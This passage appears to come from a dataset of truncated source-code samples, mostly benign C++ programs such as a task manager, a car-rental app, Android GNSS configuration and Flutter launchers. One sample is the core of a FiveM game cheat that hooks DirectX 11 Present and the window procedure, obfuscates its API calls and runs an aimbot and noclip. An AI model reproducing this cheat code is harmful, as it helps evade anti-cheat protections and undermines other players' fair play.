have?\r\n\r\nclass TaskManager {\r\nprivate:\r\n    int nextID;\r\n    vector<Task> tasks;\r\n\r\npublic:\r\n// We need constructors getters and setters\r\n// Then we need to decide what we want our task Manager to do.\r\n// So I would like it to add tasks, update tasks, and also to delete tasks. I would like to view tasks as well.\r\n\r\n    TaskManager() : nextID(1) {}\r\n    \r\n    int getID() const {\r\n        return nextID;\r\n    }\r\n\r\n    void addTask(string title, string description, string status) {\r\n        tasks.emplace_back(nextID ++, title, description, status);\r\n    }\r\n    \r\n    void viewTasks() {\r\n        for (size_t i = 0; i < tasks.size(); i++) {\r\n            tasks[i].display();\r\n            cout << \"-------------------------------------\" << endl;\r\n        }\r\n    }\r\n\r\n    void updateTask(int id, string title, string description, string status) {\r\n        for (size_t i = 0; i < tasks.size(); i++) {\r\n            if (tasks[i].getID() == id) {\r\n                tasks[i].setTitle(title);\r\n                tasks[i].setDescription(description);\r\n                tasks[i].setStatus(status);\r\n                return ;\r\n            }\r\n        }\r\n        cout << \"Task not found.\" << endl; // Task ID not found in the vector\r\n    }\r\n\r\n    void deleteTask(int id) {\r\n        for (size_t i = 0; i < tasks.size(); ++i) { // Iterate over vector elements\r\n            if (tasks[i].getID() == id) { // Check if current task's ID matches\r\n                tasks.erase(tasks.begin() + i); // Remove element using iterator\r\n                return; // Exit function after deleting the task\r\n            }\r\n        }\r\n        cout << \"Task not found.\" << endl; // Task ID not found in the vector\r\n    }\r\n    void saveToFile(const string& filename) const {\r\n        ofstream file(filename);\r\n        for (const auto& task : tasks) {\r\n            file << task.getID() << '\\n' << task.getTitle() << '\\n'\r\n                 << task.getDescription() << '\\n' << task.getStatus() << '\\n';\r\n        }\r\n    }\r\n\r\n    // Method to load tasks from a file\r\n    void loadFromFile(const string& filename) {\r\n        ifstream file(filename);\r\n        int id;\r\n        string title, description, status;\r\n\r\n        while (file >> id >> ws) {\r\n            getline(file, title);\r\n            getline(file, description);\r\n            getline(file, status);\r\n            tasks.emplace_back(id, title, description, status);\r\n            nextID = max(nextID, id + 1);\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    int choice;\r\n    TaskManager manager;\r\n    while (true) {\r\n        cout << \"1. Add Task\\n2. View Tasks\\n3. Update Task\\n4. Delete Task\\n5. Save and Exit\\n\";\r\n        cin >> choice;\r\n        cin.ignore();\r\n\r\n        if (choice == 1) {\r\n            string title;\r\n            string description;\r\n            string status;\r\n            cout << \"Enter the title: \" ;\r\n            getline(cin,title);\r\n            cout << \"Enter the descritpion: \" ;\r\n            getline(cin,description);\r\n            cout << \"Enter the status: \" ;\r\n            getline(cin,status);\r\n            manager.addTask(title,description,status);\r\n        } else if (choice == 2) {\r\n            manager.viewTasks();\r\n        } else if (choice == 3) {\r\n            int id;\r\n            string title, description, status;\r\n            cout << \"Enter task ID to update: \";\r\n            cin >> id;\r\n            cin.ignore();\r\n            cout << \"Enter new title: \";\r\n            getline(cin, title);\r\n            cout << \"Enter new description: \";\r\n            getline(cin, description);\r\n            cout << \"Enter new status: \";\r\n            getline(cin, status);\r\n            manager.updateTask(i",
    "#include \"Class_Function.h\"\r\n#include \"Utility_Function.h\"\r\nint main()\r\n{\r\n   \r\n\r\n    int x1, x2, x3, x4, x5, x6;\r\n    cars Info;\r\n    Person data;\r\n    Booked_Car booked;\r\n    TotalRent Rent;\r\n    const string filename = \"quantity.txt\";\r\n\r\n    if (!fileExists(filename))\r\n    {\r\n\r\n        ofstream file(filename);\r\n\r\n        // Check if the file is opened successfully\r\n        if (!file.is_open())\r\n        {\r\n            cerr << \">>>Failed to create the file!\\n\";\r\n            return 1;\r\n        }\r\n\r\n        for (int i = 0; i < 6; i++) // Initialize with base quantity...\r\n        {\r\n            file << \"2\\n\";\r\n        }\r\n\r\n        file.close(); // Close the file\r\n\r\n        // cout << \">>>File created successfully.\\n\";\r\n    }\r\n    else\r\n    {\r\n        // cout << \">>>File already exists. No action taken.\\n\";\r\n    }\r\n\r\n    int choice, use;\r\n    do\r\n    {\r\n        Menu();\r\n        setColor(31);\r\n        cout << \"\\t\\t\\t Enter 1 for admin \\n\\t\\t\\t Enter 2 for user  \\n\\t\\t\\t Enter 3 to Exit.\\n\"\r\n            << endl;\r\n        cout << \"\\n\\t\\t\\t Choice: \";\r\n\r\n        do\r\n        {\r\n            cin >> use;\r\n            Validation(use);\r\n            if (use < 1 || use > 3)\r\n            {\r\n                cout << \"\\n\\t\\t\\t>>>Enter 1 to 3 : \";\r\n            }\r\n        } while (use < 1 || use > 3);\r\n        resetColor();\r\n        system(\"cls\");\r\n\r\n        string username, pass;\r\n        string default_username = \"admin\";\r\n        string default_password = \"pass\";\r\n        string update_pass;\r\n        int a = 0;\r\n        int Book_ment;\r\n        int num_day;\r\n        double num_hour;\r\n        int checking;\r\n\r\n        // switch\r\n        switch (use)\r\n        {\r\n        case 1:\r\n            // Admin Login and Password handle...\r\n            Menu_admin();\r\n            do\r\n            {\r\n                setColor(33);\r\n                cout << \"\\t\\t\\tEnter your User name (Minimum 4 Letters...) : \\n\";\r\n                cout << \"\\t\\t\\tUsername: \";\r\n                cin >> username;\r\n                if (!(username.size() > 3))\r\n                {\r\n                    cout << \"\\t\\t\\tError ! : \" << endl;\r\n                }\r\n            } while (!(username.size() > 3));\r\n            do\r\n            {\r\n                cout << \"\\t\\t\\tEnter Password (Minimum 4 Letters...) : \\n\";\r\n                cout << \"\\t\\t\\tPassword: \";\r\n                cin >> pass;\r\n                if (!(pass.size() > 3))\r\n                {\r\n                    cout << \"\\t\\t\\tError ! : \" << endl;\r\n                    Sleep(1500);\r\n                }\r\n            } while (!(pass.size() > 3));\r\n            system(\"cls\");\r\n            Menu_admin();\r\n            if ((username == default_username) && (pass == default_password))\r\n            {\r\n                a += 2;\r\n            }\r\n            else\r\n            {\r\n                cout << \"\\n\\t\\t\\tWrong Username & Password...\" << endl;\r\n                Sleep(2000);\r\n            }\r\n            resetColor();\r\n\r\n            if (a == 2)\r\n            {\r\n                int x = 0;\r\n                setColor(31);\r\n                cout << \"\\t\\t\\tPress 1 ( Loading the data of Customers who Rented the cars )\" << endl\r\n                    << endl;\r\n                cout << \"\\t\\t\\tPress 2 ( See the active status of any of Customer )\" << endl\r\n                    << endl;\r\n                cout << \"\\t\\t\\tPress 3 ( See the Quantity of all Cars Available )\" << endl\r\n                    << endl;\r\n                cout << \"\\t\\t\\tPress 4 ( Reset all Data )\" << endl\r\n                    << endl;\r\n                resetColor();\r\n\r\n                do\r\n                {\r\n                    cout << \"\\n\\t\\t\\tChoice: \";\r\n                    cin >> x;\r\n                    Validation(x);\r\n                    if (x < 1 || x >= 5)\r\n                    {\r\n                        cout << \"\\t\\t\\tEnter 1 to 4 : \";\r\n                    }\r\n                } while (x < 1 || x >= 5);\r\n                if (x == 1)\r\n                {\r\n                    system(\"cls\");\r\n                    cout << \">>>Loading All Customers Information...Please wait...\" << endl;\r\n                    Sleep(4500);\r\n                    system(\"cls\");\r\n                    cout << endl;\r\n                    booked.Get_Booked();\r\n                    cout << \"\\t\\t\\tPress Any Key to Logout or Go to MAIN menu : \";\r\n                }\r\n                else if (x == 2)\r\n                {\r\n                    system(\"cls\");\r\n                    cout << \">>>Loading Customer's Information...Please wait...\" << endl;\r\n                    Sleep(4500);\r\n                    system(\"cls\");\r\n                    string cnic_to_search = \"\";\r\n                    bool check1 = false;\r\n                    do\r\n                    {\r\n                        setColor(33);\r\n\r\n                        int a = 0;\r\n                        cout << \"\\t\\t\\tEnter CNIC you wanna find ( 13 Digits without Dashes... ) : \";\r\n                        cin >> cnic_to_search;\r\n                        for (int i = 0; i < cnic_to_search.siz",
    "/*\n * Copyright (c) 2017-2019, 2021, The Linux Foundation. All rights reserved.\n * Not a Contribution\n */\n/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"LocSvc_GnssConfigurationInterface\"\n\n#include <log_util.h>\n#include \"Gnss.h\"\n#include \"GnssConfiguration.h\"\n#include \"ContextBase.h\"\n#include <android/hardware/gnss/1.0/types.h>\n\nnamespace android {\nnamespace hardware {\nnamespace gnss {\nnamespace V2_0 {\nnamespace implementation {\n\nusing ::android::hardware::gnss::V1_0::GnssConstellationType;\nusing namespace loc_core;\n\nGnssConfiguration::GnssConfiguration(Gnss* gnss) : mGnss(gnss) {\n}\n\n// Methods from ::android::hardware::gps::V1_0::IGnssConfiguration follow.\nReturn<bool> GnssConfiguration::setSuplEs(bool enabled)  {\n    // deprecated function. Must return false to pass VTS\n    return false;\n}\n\nReturn<bool> GnssConfiguration::setSuplVersion(uint32_t version)  {\n    if (mGnss == nullptr) {\n        LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config;\n    memset(&config, 0, sizeof(GnssConfig));\n    config.size = sizeof(GnssConfig);\n    config.flags = GNSS_CONFIG_FLAGS_SUPL_VERSION_VALID_BIT;\n    switch (version) {\n        case 0x00020004:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_2_0_4;\n            break;\n        case 0x00020002:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_2_0_2;\n            break;\n        case 0x00020000:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_2_0_0;\n            break;\n        case 0x00010000:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_1_0_0;\n            break;\n        default:\n            LOC_LOGE(\"%s]: invalid version: 0x%x.\", __FUNCTION__, version);\n            return false;\n    }\n\n    return mGnss->updateConfiguration(config);\n}\n\nReturn<bool> GnssConfiguration::setSuplMode(uint8_t mode)  {\n    if (mGnss == nullptr) {\n        LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config;\n    memset(&config, 0, sizeof(GnssConfig));\n    config.size = sizeof(GnssConfig);\n    config.flags = GNSS_CONFIG_FLAGS_SUPL_MODE_BIT;\n    switch (mode) {\n        case 0:\n            config.suplModeMask = 0; // STANDALONE ONLY\n            break;\n        case 1:\n            config.suplModeMask = GNSS_CONFIG_SUPL_MODE_MSB_BIT;\n            break;\n        case 2:\n            config.suplModeMask = GNSS_CONFIG_SUPL_MODE_MSA_BIT;\n            break;\n        case 3:\n            config.suplModeMask = GNSS_CONFIG_SUPL_MODE_MSB_BIT | GNSS_CONFIG_SUPL_MODE_MSA_BIT;\n            break;\n        default:\n            LOC_LOGE(\"%s]: invalid mode: %d.\", __FUNCTION__, mode);\n            return false;\n    }\n\n    return mGnss->updateConfiguration(config);\n}\n\nReturn<bool> GnssConfiguration::setLppProfile(uint8_t lppProfileMask) {\n    if (mGnss == nullptr) {\n        LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config = {};\n    config.size = sizeof(GnssConfig);\n    config.flags = GNSS_CONFIG_FLAGS_LPP_PROFILE_VALID_BIT;\n    config.lppProfileMask = GNSS_CONFIG_LPP_PROFILE_RRLP_ON_LTE; //default\n\n    if (lppProfileMask & (1<<0)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_USER_PLANE_BIT;\n    }\n    if (lppProfileMask & (1<<1)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_CONTROL_PLANE_BIT;\n    }\n    if (lppProfileMask & (1<<2)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_USER_PLANE_OVER_NR5G_SA_BIT;\n    }\n    if (lppProfileMask & (1<<3)) {\n        config.lppProfileMask |= GNSS_CONFIG_LPP_PROFILE_CONTROL_PLANE_OVER_NR5G_SA_BIT;\n    }\n\n    return mGnss->updateConfiguration(config);\n}\n\nReturn<bool> GnssConfiguration::setGlonassPositioningProtocol(uint8_t protocol) {\n    if (mGnss == nullptr) {\n        LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config;\n    memset(&config, 0, sizeof(GnssConfig));\n    config.size = sizeof(GnssConfig);\n\n    config.flags = GNSS_CONFIG_FLAGS_AGLONASS_POSITION_PROTOCOL_VALID_BIT;\n    if (protocol & (1<<0)) {\n        config.aGlonassPositionProtocolMask |= GNSS_CONFIG_RRC_CONTROL_PLANE_BIT;\n    }\n    if (protocol & (1<<1)) {\n        config.aGlonassPositionProtocolMask |= GNSS_CONFIG_RRLP_USER_PLANE_BIT;\n    }\n    if (protocol & (1<<2)) {\n        config.aGlonassPositionProtocolMask |= GNSS_CONFIG_LLP_USER_PLANE_BIT;\n    }\n    if (protocol & (1<<3)) {\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"photo_editor\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* Escreva uma implementa\u00e7\u00e3o de fila ilimitada utilizando vetor (alocado dinamicamente). O vetor inicial deve ter tamanho 1 ou 2. Sempre que o vetor estiver cheio, utilize a estrat\u00e9gia de redimensionamento eficiente estudada na aula: substitu\u00ed-lo por outro com o dobro do tamanho.Al\u00e9m de expandir o vetor quando ele estiver cheio, tamb\u00e9m \"contraia\" o vetor (isto \u00e9, substitua-o por outro menor) quando ele estiver significativamente vazio.   */\n\n#include <iostream>\n#include <string>\n#include <new>\n#include <cstring>\n\nusing namespace std;\n\nstruct Fila {\n\n    int lim_atual = 2;\n    int n = 0; //contador de numero de elementos na fila\n    int* v = new int[lim_atual];\n    int* p = &v[0]; // primeiro da fila, usardo apenas na fun\u00e7\u00e3o de mostrar_primeiro()\n\n};\n\nbool vazia (Fila &a) {\n    return (a .n == 0);\n}\n\nbool cheia (Fila &a) {\n    return (a .n == a .lim_atual);\n}\n\nbool enfilar(Fila &f, int x) {\n    if (cheia(f)) {\n        int novo_tam = f.lim_atual * 2;\n        int* temp = new int[novo_tam];\n        memcpy(temp, f.v, sizeof(int) * f.lim_atual);\n        delete[] f.v;\n        f.v = temp;\n        f.lim_atual = novo_tam;\n    }\n\n    f.v[f.n] = x;\n    f.n += 1;\n    return true;\n}\n\nbool desenfilar(Fila &f) {\n\n    if (vazia(f)) {\n        return false;\n    }\n\n    for (int i = 1; i < f.n; i++) {\n        f.v[i - 1] = f.v[i];\n    }\n\n    f .n -= 1;\n\n    if (f. n > 0 && f .n <= f .lim_atual/4) { //redimensiona o vetor\n        int novo_tam = (f .lim_atual)/2;\n        int* temp = new int[novo_tam];\n        memcpy(temp, f .v,sizeof(int)*f .n);\n        delete[] f .v;\n        f .v = temp;\n        f .p = f .v;\n        f .lim_atual = novo_tam;\n    }\n    return true;\n}\n\nvoid mostrar (Fila &f) {\n\n    if (vazia(f)) {\n        cout << \"Fila vazia!\";\n    } else {\n        cout << \"Essa eh a fila: \";\n    for (int i = 0; i < f .n ; i++)\n    {\n        cout << f .v[i] << \" \";\n    }\n    }\n    \n}\n \nint main() {\n\n    Fila fila;\n    char opcao;\n\n    for (;;) {\n\n        cout << \"Escolha a acao (Enfilar, Desenfilar, Mostrar fila, Sair): \";\n\n        cin >> opcao;\n\n        cout << endl;\n\n        if (opcao == 'E') {\n            int valor;\n            cout << \"Digite o valor que quer enfilar:\";\n            cin >> valor;\n            cout << endl;\n            enfilar(fila,valor);\n            cout << \"Valor enfilado com sucesso!\";\n        } \n        else if (opcao == 'D'){\n            if (desenfilar(fila)){\n                cout << \"Desenfilado com sucesso\";\n            } else {\n                cout << \"A fila esta vazia, impossivel desenfilar!\";\n            }\n        } \n        else if (opcao == 'M') {\n            mostrar(fila);\n        }\n        else if (opcao == 'S') {\n\n            cout << endl;\n            cout << endl;\n            cout << \"P R O G R A M A    E N C E R R A D O\";\n            cout << endl;\n            cout << endl;\n            break;\n        }\n\n\n        cout << endl;\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "\ufeff// Georgy Treshchev 2024.\n\n#include \"SpeechRecognizerModelFactory.h\"\n#include \"SpeechRecognizerEditorDefines.h\"\n#include \"SpeechRecognizerModel.h\"\n#include \"Misc/FileHelper.h\"\n#include \"Misc/MessageDialog.h\"\n\n#define LOCTEXT_NAMESPACE \"SpeechRecognizerModelFactory\"\n\nUSpeechRecognizerModelFactory::USpeechRecognizerModelFactory()\n{\n\tbCreateNew = true;\n\tbEditAfterNew = true;\n\tSupportedClass = USpeechRecognizerModel::StaticClass();\n}\n\nUObject* USpeechRecognizerModelFactory::FactoryCreateNew(UClass* Class, UObject* InParent, FName Name, EObjectFlags Flags, UObject* Context, FFeedbackContext* Warn)\n{\n\tcheck(Class->IsChildOf(USpeechRecognizerModel::StaticClass()));\n\t\n\tUSpeechRecognizerModel* LanguageModel = NewObject<USpeechRecognizerModel>(InParent, Class, Name, Flags);\n\tif (!LanguageModel)\n\t{\n\t\tFMessageDialog::Open(EAppMsgType::Ok, LOCTEXT(\"LanguageModelCreateFailed\", \"The RuntimeSpeechRecognizer cannot function correctly because the language model asset could not be created\"));\n\t\tUE_LOG(LogEditorRuntimeSpeechRecognizer, Error, TEXT(\"Failed to create language model asset\"));\n\t\treturn nullptr;\n\t}\n\n\tTArray64<uint8> ModelData;\n\tif (!FFileHelper::LoadFileToArray(ModelData, *LanguageModelPath))\n\t{\n\t\tFMessageDialog::Open(EAppMsgType::Ok, LOCTEXT(\"LanguageModelLoadFailed\", \"The RuntimeSpeechRecognizer cannot function correctly because the language model file could not be loaded\"));\n\t\tUE_LOG(LogEditorRuntimeSpeechRecognizer, Error, TEXT(\"Failed to load language model file from %s\"), *LanguageModelPath);\n\t\treturn nullptr;\n\t}\n\n\t// Copy the language model data into the bulk data\n\t{\n\t\tLanguageModel->LanguageModelBulkData.Lock(LOCK_READ_WRITE);\n\t\tvoid* DataPtr = LanguageModel->LanguageModelBulkData.Realloc(ModelData.Num());\n\t\tFMemory::Memcpy(DataPtr, ModelData.GetData(), ModelData.Num());\n\t\tLanguageModel->LanguageModelBulkData.Unlock();\n\t}\n\n\tUE_LOG(LogEditorRuntimeSpeechRecognizer, Log, TEXT(\"Loaded language model file from '%s' to asset '%s' with size %lld bytes\"), *LanguageModelPath, *LanguageModel->GetPathName(), LanguageModel->LanguageModelBulkData.GetBulkDataSize());\n\treturn LanguageModel;\n}\n\n#undef LOCTEXT_NAMESPACE",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"myapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include <string>\n#include <iostream>\n#include <vector>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n#include <thread>\n#include <chrono>\n#include <iomanip>\nusing namespace std;\n\nclass Media {\npublic:\n    string type; ///whether it's a movie or tv show\n    int points; /// points keep updating based on quiz\n    double rating; ///quality rating\n    string maturity; ///maturity rating\n    int year; ///year released\n    string yearString;\n    string genre;\n    string title;\n\n\n    // Default constructor\n    Media()\n        : type(\"\"), points(0), rating(0.0), maturity(\"\"), year(0), yearString(\"\"), genre(\"\"), title(\"\") {}\n\n    ///when initializing, have to check if the value is null\n    Media(string type, double rating, string maturity, int year, string yearString, string genre, string title) {\n        this->type = type;\n        this->points = 0;\n        this->rating = rating;\n        this->maturity = maturity;\n        this->year = year;\n        this->yearString = yearString;\n        this->genre = genre;\n        this->title = title;\n    }\n\n    void AddPoints(int num) {\n        points += num;\n    }\n\n};\n\nvoid merge(vector<Media>& media, int left, int mid, int right) {\n    int n1 = mid - left + 1;\n    int n2 = right - mid;\n\n    // Temporary vectors to hold the split sections\n    vector<Media> L(n1);\n    vector<Media> R(n2);\n\n    // Copying data to temporary vectors\n    for (int i = 0; i < n1; i++)\n        L[i] = media[left + i];\n    for (int j = 0; j < n2; j++)\n        R[j] = media[mid + 1 + j];\n\n    int i = 0, j = 0, k = left;\n    while (i < n1 && j < n2) {\n        if (L[i].points >= R[j].points) { // Sorting by points\n            media[k] = L[i];\n            i++;\n        }\n        else {\n            media[k] = R[j];\n    